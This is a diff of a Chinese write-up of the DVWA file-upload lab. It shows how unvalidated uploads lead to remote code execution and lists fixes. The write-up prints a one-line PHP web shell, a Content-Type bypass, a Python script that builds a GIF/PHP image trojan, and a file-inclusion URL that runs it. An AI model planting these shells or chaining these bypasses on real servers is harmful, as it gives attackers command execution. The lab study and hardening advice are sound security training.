@@ -1,147 +1,138 @@
 # File Upload
 
-头像上传。服务器收下文件、存进 Web 目录，但没管它是什么东西。上传的脚本能被浏览器直接访问，也能被 PHP 解析执行，问题就在这里。
+上传文件既没有校验类型，也没有限制执行权限。传上去的脚本能被浏览器访问，也能被 PHP 解析，这就是一个直接落地的 RCE。
 
-有漏洞的那一行大概长这样：
+## 漏洞在哪
 
 ```php
+$target_path = 'hackable/uploads/' . basename($_FILES['uploaded']['name']);
 move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path);
 ```
 
-`$target_path` 直接写在 `hackable/uploads/` 下面，没有任何校验。
+后缀、类型、内容一律不看，文件名原样保留，目录就在 Web 根下。三个条件凑齐，上传即执行。
+
+## 等级对照
+
+| 等级 | 校验 | 本机结果 |
+|---|---|---|
+| Low | 无 | 直接传 PHP，`whoami` 执行成功 |
+| Medium | 检查 `Content-Type` | 抓包改成 `image/jpeg` 后成功 |
+| High | 后缀白名单 + `getimagesize()` | 图片马可上传，需配合文件包含才执行 |
+| Impossible | 重新编码 + 随机文件名 + 禁执行 | 打不进去 |
 
 ## Low
 
-后缀、类型、内容一样都不查。
-
-先传一个探针，确认 PHP 会被执行：
-
-```php
-<?php phpinfo(); ?>
-```
-
-存成 `info.php` 上传，访问 `http://127.0.0.1/dvwa/hackable/uploads/info.php`。页面出来一整页 PHP 配置信息，说明服务器把它当 PHP 执行了，而不是当文本读。
-
-![phpinfo 执行成功](low1.png)
-
-再换成能带参数执行的一条：
+| 项 | 内容 |
+|---|---|
+| 探针 | `info.php` 内容 `<?php phpinfo(); ?>` |
+| 落地路径 | `http://127.0.0.1/dvwa/hackable/uploads/info.php` |
+| 结论 | 页面输出完整 PHP 配置，说明被解析执行 |
+| 危害 | 换成带参数的一句话即可任意命令执行 |
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-访问 `...uploads/shell.php?cmd=whoami`，回显 `www-data`（Windows 下会是别的账号）。这一条就够说明危害了：任意命令，权限跟 Web 服务一致。
+访问 `...uploads/shell.php?cmd=whoami` 返回 `www-data`，权限与 Web 服务一致。
+
+![phpinfo 被执行](low1.png)
 
 ![执行 whoami](low2.png)
 
-很多人到这一步就停了，其实还该看两件事：上传目录能不能列目录、上传的文件有没有被重命名。DVWA 里都是原始文件名，所以能直接猜路径。
+上传成功后还要看两件事：目录能不能列、文件有没有被重命名。DVWA 保留原始文件名，所以路径可以猜。
 
 ## Medium
 
-Medium 查了 `$_FILES['uploaded']['type']`，只放 `image/jpeg` 和 `image/png`。
-
-这个值是浏览器随请求一起发上来的，属于客户端数据，改一下就过。默认直接传 `shell.php` 会失败，提示 `Your image was not uploaded.`，因为浏览器给的类型是 `application/x-php`。
-
-Burp 拦下 multipart 请求，只改一行：
+| 项 | 内容 |
+|---|---|
+| 防护 | 检查 `$_FILES['uploaded']['type']`，只放 `image/jpeg`、`image/png` |
+| 失败现象 | 直接传提示 `Your image was not uploaded.` |
+| 绕过 | 抓 multipart 请求，把文件段的 `Content-Type` 改成 `image/jpeg` |
 
 ```
 Content-Disposition: form-data; name="uploaded"; filename="shell.php"
-Content-Type: application/x-php      ← 改成 image/jpeg
+Content-Type: application/x-php        ← 改成 image/jpeg
 ```
+
+改的是文件名后面那个 `Content-Type`，不是请求第一行的 `multipart/form-data`，这两处搞混是最常见的失败原因。
+
+`$_FILES['file']['type']` 完全来自客户端。判断真实类型要用 `finfo_file()` 读文件内容。
 
 ![改 Content-Type](medium1.png)
 
-再放行，文件落地。这一步的本质是"把文件在请求里伪装成图片"，服务端读的是请求头里的声明，不是文件本身。
-
-顺带记一句：`$_FILES['file']['type']` 这一整个字段都不可信，它来自客户端。判断文件类型要看 `finfo_file()` 读出来的真实内容。
-
 ## High
 
-High 开始查真东西：后缀白名单、文件大小、还有 `getimagesize()`。前两个好理解，`getimagesize()` 是读文件头，判断是不是一张结构合法的图片。
-
-到这一步流程变了：
+| 项 | 内容 |
+|---|---|
+| 防护 | 后缀白名单、大小限制、`getimagesize()` 校验真实图片 |
+| 直接传 | `info.php` 被拒，`shell.php.jpg` 也被拒（内容不是合法图片） |
+| 结果 | 图片马能上传，但直接访问不执行 |
+| 出路 | 配合文件包含，用 `file://` 包装器加载 |
 
 | 试法 | 结果 | 原因 |
 |---|---|---|
-| 传 `info.php` | 失败 | 后缀不在白名单 |
-| 传 `shell.php.jpg` | 失败 | 后缀对了，但内容不是合法图片 |
-| 传正常 `normal.jpg` | 成功 | 没问题，但只是一张图 |
-| 传图片马 | 成功上传 | 但直接访问不执行 |
+| `info.php` | 失败 | 后缀不在白名单 |
+| `shell.php.jpg` | 失败 | 后缀对，内容不是图片 |
+| `normal.jpg` | 成功 | 只是一张图 |
+| 图片马 | 上传成功 | 访问只输出乱码 |
 
-关键结论：**High 下单独的文件上传拿不到代码执行**。图片能传上去，Web 服务器也默认不会把 `.jpg` 当 PHP 解析。
-
-要真执行，得配合文件包含。DVWA 的 File Inclusion 模块正好也在，两个一拼就通了。
-
-### 图片马
-
-思路是造一个文件，既能让 `getimagesize()` 认出来是图片，尾部又带 PHP 代码。用 Python 拼最省事：
+造图片马用 Python 拼最小合法 GIF 头，再接 PHP 代码：
 
 ```python
 from pathlib import Path
 
-gif_header = (
-    b"GIF89a"
-    b"\x01\x00\x01\x00\x80\x00\x00"
-    b"\x00\x00\x00\xff\xff\xff"
-    b",\x00\x00\x00\x00\x01\x00\x01\x00\x00"
-    b"\x02\x02D\x01\x00;"
-)
+gif = (b"GIF89a" b"\x01\x00\x01\x00\x80\x00\x00" b"\x00\x00\x00\xff\xff\xff"
+       b",\x00\x00\x00\x00\x01\x00\x01\x00\x00" b"\x02\x02D\x01\x00;")
 
-php_payload = b'''<?php
-if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
-else { echo "usage: ?page=file:///path/to/123.jpg&cmd=whoami"; }
-'''
+php = b'<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
 
 out = Path(r"D:/phpstudy_pro/File Upload/123.jpg")
-out.parent.mkdir(parents=True, exist_ok=True)
-out.write_bytes(gif_header + php_payload)
-print(out, out.stat().st_size)
+out.write_bytes(gif + php)
+print(out.stat().st_size)
 ```
 
-生成的是 `.jpg` 后缀，但文件头是合法 GIF。`getimagesize()` 认的是内容，所以能过。
+文件后缀是 `.jpg`，文件头是合法 GIF，`getimagesize()` 认内容不认后缀，所以能过。
 
-上传成功后文件落在 `hackable/uploads/123.jpg`。
-
-![图片马上传成功](high2.png)
-
-### 用文件包含把它执行起来
-
-File Inclusion 的 High 允许 `file*` 开头的参数，正好能用 `file://` 包装器。构造：
+上传后落在 `hackable/uploads/123.jpg`，再用文件包含执行：
 
 ```
 http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///D:/phpstudy_pro/WWW/DVWA/hackable/uploads/123.jpg&cmd=whoami
 ```
 
-`include` 读文件时会把文件里的 `<?php ... ?>` 当代码解析，图片头是二进制垃圾，PHP 输出的时候直接原样吐出去，不影响后面的代码执行。
+`include` 读到 `<?php ?>` 会当代码解析，前面的二进制图片头直接输出，不影响执行。
 
-![组合利用成功](high.png)
+![图片马上传成功](high2.png)
 
 ![文件包含那一步](high1.png)
 
-这条链子值得记牢：**单独一个上传高危但不致命，单独一个包含也未必能执行，两个凑一起就是 RCE**。真实环境里这种组合很常见，渗透的时候看到一个上传点别急着放弃。
+![组合利用成功](high.png)
 
-## Impossible 为什么打不进去
+这条链子要记牢：单独一个上传高危但不致命，单独一个包含未必能执行，两个凑一起就是 RCE。
 
-1. 后缀白名单（只放 jpg/png/gif）
-2. `getimagesize()` 校验
-3. 用 `imagecreatefromjpeg()` 重新编码，图片马里的 PHP 代码在这一步被整体重写掉
-4. 随机文件名，不保留用户原文件名
-5. 上传目录不给执行权限
-6. 加 CSRF token、限制大小
+## Impossible
 
-第 3 条是决定性的。前面所有绕过都是"让文件通过检查但保留 payload"，重新编码直接把文件解成像素再生成一张新图，payload 无处可藏。
+```php
+if (getimagesize($_FILES['uploaded']['tmp_name'])) {
+    // 用 imagecreatefrom* 读入，再用 image* 重新输出
+    // 随机文件名，不保留原扩展名逻辑
+}
+```
 
-## 我卡住的地方
+关键在重新编码。前面的绕过都是"通过检查但保留 payload"，重新编码把图片解成像素再生成一张新图，PHP 代码无处可藏。加上随机文件名和上传目录禁止执行脚本，三条一起才闭环。
 
-- Medium 第一次改错了位置，改的是请求头里的 `Content-Type: multipart/form-data`，那是整个表单的类型，不是文件的。要改的是 `Content-Disposition` 那一段下面、文件名后面的那个 `Content-Type`。
-- 图片马一开始用 `copy /b` 拼，拼出来的文件 `getimagesize()` 能过但上传被拒。后来发现是我拿的 jpg 本身就有问题，换成手写 GIF 头才稳定。
-- 上传成功后直接访问 `123.jpg` 只看到一堆乱码，当时以为失败。其实那说明文件在，只是 Web 服务器不解析 jpg，要配合包含才行。
+## 容易记错的地方
+
+- 改错 `Content-Type` 的位置，改成了请求行的 `multipart/form-data`，那是整个表单的类型。
+- `copy /b` 拼图片马不稳定，源图本身有问题时 `getimagesize()` 就过不了，手写 GIF 头更可靠。
+- 上传成功直接访问 `.jpg` 只看到乱码不是失败，说明文件在，只是服务器不解析该后缀。
+- 后缀白名单要判最后一个点之后的部分，`shell.php.jpg` 在只查扩展名的实现里能过。
 
 ## 怎么修
 
-1. 后缀白名单，不要黑名单。
-2. 用 `finfo_file()` 读真实类型，不看请求头。
-3. 图片类上传统一重新编码（`imagecreatefrom*` + `image*` 重新输出），丢掉所有原始字节。
-4. 重命名成随机串，不保留原文件名，也不保留后缀里的第二个点。
-5. 上传目录 `php_admin_flag engine off`，或者干脆放到 Web 根目录之外，用脚本读文件流输出。
-6. 大小限制 + CSRF token。
+| 措施 | 作用 |
+|---|---|
+| 后缀白名单 | 不用黑名单，只放业务需要的类型 |
+| `finfo_file()` 读真实类型 | 不看请求头声明 |
+| 图片重新编码 | 丢掉原始字节，图片马失效 |
+| 随机文件名 | 不保留原名，防路径猜测与二次利用 |
+| 上传目录禁执行 | `php_admin_flag engine off`，或放到 Web 根之外 |
